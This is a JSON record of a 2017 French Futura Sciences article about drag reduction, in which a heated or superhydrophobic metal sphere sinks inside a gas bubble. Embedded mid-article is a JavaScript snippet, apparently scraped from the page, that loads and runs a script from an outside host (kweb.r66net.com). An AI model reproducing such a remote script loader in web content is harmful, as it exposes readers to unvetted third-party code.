{"title": "La traînée nulle, le graal de la mécanique des fluides", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "14/09/2017", "content": "Faire en sorte qu'un objet se déplace dans l'eau quasiment sans subir de résistance et vaincre ainsi la force de traînée, c'est le rêve de tout mécanicien des fluides. Aujourd'hui, des chercheurs affirment avoir trouvé la solution. Selon eux, il suffit d'entourer cet objet... d'une bulle de gaz ! Ce qu'il faut retenir La traînée correspond à une force qui s’oppose au mouvement d’un corps dans un liquide ou un gaz. Vaincre la traînée pourrait permettre de construire des bateaux beaucoup moins énergivores. Des chercheurs ont montré qu’une bille de métal prise dans une bulle de gaz épaisse coule dans une piscine en générant quelque 10 fois moins de traînée qu’une bille classique. La force de traînée : au cours de l'évolution, certains  poissons  — le requin en est un bel exemple — ont déployé des trésors d'imagination pour la contrer et avancer plus vite en dépensant moins d' énergie . Certaines de leurs solutions leur ont été empruntées par les ingénieurs pour améliorer les performances des nageurs ou des bateaux, mais toujours sans parvenir à faire des miracles. À peine la traînée a-t-elle pu être réduite de 5 à 10 %. Jusqu'à ce qu'aujourd'hui, une  équipe internationale de chercheurs  annonce avoir atteint le graal ! Ce résultat, ils l'ont obtenu en laissant tomber une bille de  métal  de quelque 2 centimètres de diamètre dans une piscine de telle manière qu'une  bulle de gaz  en forme de larme se crée autour de la bille. L'ensemble a coulé en générant près de 10 fois moins de traînée (cette force s'opposant au  mouvement d'un corps  qui se déplace dans un  liquide  ou même dans un  gaz ) qu'une bille de métal sans bulle ne l'aurait fait. Un corps se mouvant à vitesse constante dans un fluide parfait ne subit ni traînée ni portance. C’est ce qu’énonce le paradoxe de d’Alembert. © Quentin de La Tour, Wikipédia, DP                               Une bulle de gaz pour réduire la traînée Simple ? Pas tant que ça. Car pour que cette fameuse bulle de gaz se forme, il faut que des conditions particulières soient réunies. On peut d'abord chauffer la bille de métal à quelque 400 °C et l'eau à environ 95 °C. Lorsque la bille entre dans l'eau, une petite quantité de cette eau entre alors en ébullition et il se crée une couche de  vapeur d’eau , un gaz qui va envelopper la bille. Si l'on veut procéder à température ambiante, il faut couvrir la bille d'un  revêtement superhydrophobe  qui repousse l'eau et maintient une couche de gaz autour de la bille.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avec des couches de gaz de moins d'un millimètre d'épaisseur, la traînée peut déjà être réduite de 10 à 20 %. Mais l'équipe internationale n'a pas voulu s'arrêter là. Les chercheurs ont tenté de créer, autour des billes, des bulles de gaz plus conséquentes, en les laissant tomber d'un peu plus haut. Résultat : pour ces billes, la traînée a été réduite d'un  ordre de grandeur . Selon les chercheurs, ces expériences donnent une réalité tangible à un concept jusqu'alors purement théorique connu sous le nom de « paradoxe de  d’Alembert  ». Celui-ci a été énoncé en 1768 ; selon lui, malgré le sens commun, un corps immergé dans un fluide en  mouvement  — et inversement — ne subirait aucune force. Reste désormais à appliquer cette découverte au-delà des  portes  du laboratoire, dans le monde réel... ", "theme": "sciences"}